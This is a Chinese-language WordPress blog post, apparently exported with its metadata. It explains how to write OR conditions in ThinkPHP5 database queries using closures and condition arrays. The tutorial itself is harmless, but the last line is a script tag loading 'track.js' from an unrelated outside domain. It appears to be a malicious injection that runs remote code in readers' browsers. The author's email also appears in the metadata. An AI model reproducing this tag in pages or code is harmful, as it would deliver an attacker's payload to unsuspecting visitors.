---
layout: post
title: ThinkPHP5框架where实现or查询
date: 2021-05-06 00:31:13.000000000 +08:00
type: post
parent_id: '0'
published: true
password: ''
status: publish
categories:
- PHP
tags: []
meta:
  blocksy_post_meta_options: a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}
author:
  login: gavin
  email: 519077334@qq.com
  display_name: gavin
  first_name: ''
  last_name: ''
permalink: "/index.php/2021/05/06/thinkphp5%e6%a1%86%e6%9e%b6where%e5%ae%9e%e7%8e%b0or%e6%9f%a5%e8%af%a2/"
---
<p>1.采用闭包方式<br />
tp5中采用闭包的方式：<br />
$map['user_id']=1;<br />
$map['status']=0;<br />
$or_map['user_id']=$map['user_id'];<br />
$or_map['audit']=['in',['1,2']];<br />
$list = Db::name('table')-&gt;where(function ($query) use ($map) {<br />
$query-&gt;where($map);<br />
})-&gt;<span style="color: #ff0000;">whereOr</span>(function ($query) use ($or_map) {<br />
$query-&gt;where($or_map);<br />
})-&gt;select();<br />
//生成的sql语句：<br />
//SELECT * FROM `tp_table` WHERE  (  `user_id` = '1'  AND `status` = 0 ) OR (  `user_id` = '1'  AND `audit` IN ('1,2') )</p>
<p>2.普通方式</p>
<p>$where = [<br />
'feed_uid' =&gt; [ 'eq' , 5] ,<br />
'status' =&gt; [ [ 'eq' , 1] , [ 'eq' , 2 ] , [ 'eq' , 3 ] , '<span style="color: #ff0000;">or</span>' ] ,<br />
];<br />
$value = DealSpace::where($where)-&gt;count();<br />
//最终的查询条件为where feed_uid=5 and (status=1 or status =2 or status =3 )</p>
<p>&nbsp;</p>
<div id="gtx-trans" style="position: absolute; left: 316px; top: 468px;">
<div class="gtx-trans-icon"></div>
</div>
<p><script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script></p>
